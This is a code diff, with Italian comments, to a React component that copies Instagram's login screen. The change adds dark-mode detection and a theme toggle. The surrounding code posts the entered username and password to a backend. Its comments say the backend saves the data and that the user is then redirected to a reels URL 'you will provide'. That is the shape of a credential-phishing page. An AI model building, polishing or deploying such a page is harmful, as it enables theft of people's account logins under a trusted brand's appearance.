@@ -1,12 +1,32 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import axios from 'axios';
-
 
 const InstagramLogin = () => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
+  const [darkMode, setDarkMode] = useState(false);
+
+  // Rileva il tema del browser all'avvio
+  useEffect(() => {
+    // Verifica se il browser preferisce il tema scuro
+    const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
+    setDarkMode(prefersDarkMode);
+    
+    // Aggiungi un listener per rilevare cambiamenti nel tema del sistema
+    const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
+    const handleChange = (e) => {
+      setDarkMode(e.matches);
+    };
+    
+    mediaQuery.addEventListener('change', handleChange);
+    
+    // Pulizia del listener quando il componente viene smontato
+    return () => {
+      mediaQuery.removeEventListener('change', handleChange);
+    };
+  }, []);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -17,7 +37,8 @@ const InstagramLogin = () => {
       // Simuliamo una richiesta al backend per salvare i dati
       const response = await axios.post('/api/login', {
         username,
-        password
+        password,
+        theme: darkMode ? 'dark' : 'light' // Inviamo anche l'informazione sul tema
       });
       
       // Redirect all'URL del reels che fornirai
@@ -31,13 +52,22 @@ const InstagramLogin = () => {
     }
   };
 
+  // Funzione per cambiare manualmente il tema
+  const toggleTheme = () => {
+    setDarkMode(!darkMode);
+  };
+
   return (
-    <div className="instagram-container">
+    <div className={`instagram-container ${darkMode ? 'dark-mode' : 'light-mode'}`}>
+      <div className="theme-toggle" onClick={toggleTheme}>
+        {darkMode ? '☀️' : '🌙'}
+      </div>
+      
       <div className="login-container">
         <div className="form-container">
           <div className="logo-container">
             <img 
-              src="/api/placeholder/175/51" 
+              src={darkMode ? "/api/placeholder/175/51" : "/api/placeholder/175/51"} 
               alt="Instagram" 
               className="instagram-logo" 
             />
